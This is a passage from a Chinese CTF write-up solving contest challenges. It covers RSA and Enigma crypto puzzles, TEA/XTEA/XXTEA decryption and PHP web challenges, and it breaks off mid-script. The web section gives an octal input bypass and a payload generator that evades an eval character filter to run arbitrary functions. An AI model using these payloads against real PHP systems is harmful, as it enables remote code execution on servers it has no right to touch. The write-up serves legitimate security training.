War3 Model Editor，找到flag字符串。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="闪电五连鞭·一鞭"><a href="#闪电五连鞭·一鞭" class="headerlink" title="闪电五连鞭·一鞭"></a>闪电五连鞭·一鞭</h3><blockquote><p>朋友们好。</p><p>今天，和大家，探讨一下，怎样打RSA置换闪电鞭。</p><p>要做到三点。</p><p>一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释；</p><p>二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊……</p><p>三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊……</p><p>下面我打一个连五鞭啊……打了五鞭：<strong>一鞭</strong>，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出flag，打出RSA置换闪电鞭！</p><p>谢谢朋友们。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span></span><br><span class="line">c = <span class="number">6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·二鞭"><a href="#闪电五连鞭·二鞭" class="headerlink" title="闪电五连鞭·二鞭"></a>闪电五连鞭·二鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line">n = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line">c = [...]</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    C.append(c[i*<span class="number">36</span>:(i+<span class="number">1</span>)*<span class="number">36</span>])</span><br><span class="line">C = Matrix(Zn, C)</span><br><span class="line">B_inv = B^<span class="number">3</span></span><br><span class="line">C_new = C / B_inv</span><br><span class="line">cc = C_new[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·三鞭"><a href="#闪电五连鞭·三鞭" class="headerlink" title="闪电五连鞭·三鞭"></a>闪电五连鞭·三鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^3</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">cc = <span class="number">2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">36</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·四鞭"><a href="#闪电五连鞭·四鞭" class="headerlink" title="闪电五连鞭·四鞭"></a>闪电五连鞭·四鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^17</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"><span class="comment"># I.trace() = 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993</span></span><br><span class="line">cc = <span class="number">5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">88</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">17</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="大鸟转转转"><a href="#大鸟转转转" class="headerlink" title="大鸟转转转"></a>大鸟转转转</h3><blockquote><p>为响应群主“怎么简单怎么来”的号召，特补上一道古典密码。</p><p>明文密文都是大写字母。</p><p>请解出正确的明文后，把明文转换成<strong>小写</strong>，并加上格式所包含的花括号。</p></blockquote><p>Engima密码机。</p><p>python反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">x = pickle.load(<span class="built_in">open</span>(<span class="string">&#x27;nimage.pickle&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>尝试用全脚本解密得到的结果有问题，再用pycipher工具解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> dic:</span><br><span class="line">            eng = Enigma(settings=(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),rotors=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                 ringstellung=(x,y,z),steckers=[(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>),</span><br><span class="line">                 (<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;I&#x27;</span>)])</span><br><span class="line">            flag = eng.decipher(<span class="string">&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;CTFSHOW&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>((x,y,z),flag.lower())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Tea-tube-pot"><a href="#Tea-tube-pot" class="headerlink" title="Tea_tube_pot"></a>Tea_tube_pot</h3><blockquote><p>三点几嚟，饮茶先啦！（给大佬递茶.jpg）</p></blockquote><p>flag分三部分。</p><p>第一部分 TEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x5FD744F6</span>,<span class="number">0x95832046</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ENCrT1ny</span></span><br></pre></td></tr></table></figure><p>第二部分 XTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0xFD731313</span>, <span class="number">0x6662CB90</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># yPti0nA1</span></span><br></pre></td></tr></table></figure><p>第三部分 XXTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x4B136C82</span>, <span class="number">0x1A6E9613</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 9ori7hM!</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wuqian"><a href="#wuqian" class="headerlink" title="wuqian"></a>wuqian</h3><p>ROP x64签到。然后签退。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h3><blockquote><p>最简单的签到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>八进制绕过，前面加个字符：<code>?num=%0a010574</code>。</p><p>​    </p><h3 id="shellme"><a href="#shellme" class="headerlink" title="shellme"></a>shellme</h3><blockquote><p>还是熟悉的感觉</p></blockquote><p>phpinfo页面直接搜flag，很熟悉。</p><p>​    </p><h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><blockquote><p>由于上个题有严重的非预期，我的锅，在此给师傅们道歉了</p></blockquote><p>cookie 看到 hint=looklook，访问 <code>?looklook=1</code> 得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>禁用了很多 RCE 绕过姿势，未禁用 <code>$+_;?()[]&lt;&gt;</code>、字母<code>C</code> 和数字<code>0-3</code>，尝试用截断输出内容，用PHP自增特性生成其他字母：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=[];?&gt;&lt;?=$_ //真Array</span><br><span class="line">$_=([].C);?&gt;&lt;?=$_ //字符串ArrayC</span><br><span class="line">$_=([].C)[3];?&gt;&lt;?=$_ //字母a</span><br><span class="line">$_=([].C)[3];$_++;?&gt;&lt;?=$_ //字母b</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>根据PHP拼接特性，将需要的关键字拆分成字母，用自增特性生成，按照字母序生成可节省payload长度。</p><p>payload生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span 